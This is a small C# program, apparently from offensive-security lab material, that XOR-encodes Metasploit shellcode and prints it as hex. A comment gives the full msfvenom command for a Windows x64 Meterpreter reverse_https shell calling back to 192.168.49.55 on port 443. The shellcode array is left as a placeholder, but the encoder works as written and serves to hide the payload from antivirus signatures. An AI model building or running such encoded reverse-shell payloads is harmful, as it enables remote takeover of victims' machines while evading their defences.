using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XOREncoder
{
    class Program
    {
        private const int XOR_KEY = 0x20;

        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.55 LPORT=443 EXITFUNC=thread -f csharp -o met.cs
            byte[] buf = new byte[721] {
				// -----------------
            	// INSERT MSFVENOM CODE HERE
				// -----------------
			};

            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] ^ XOR_KEY) & 0xFF);
            }
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }
            Console.WriteLine("The payload is: " + hex.ToString());
            Console.WriteLine("buf len: " + buf.Length);
        }
    }
}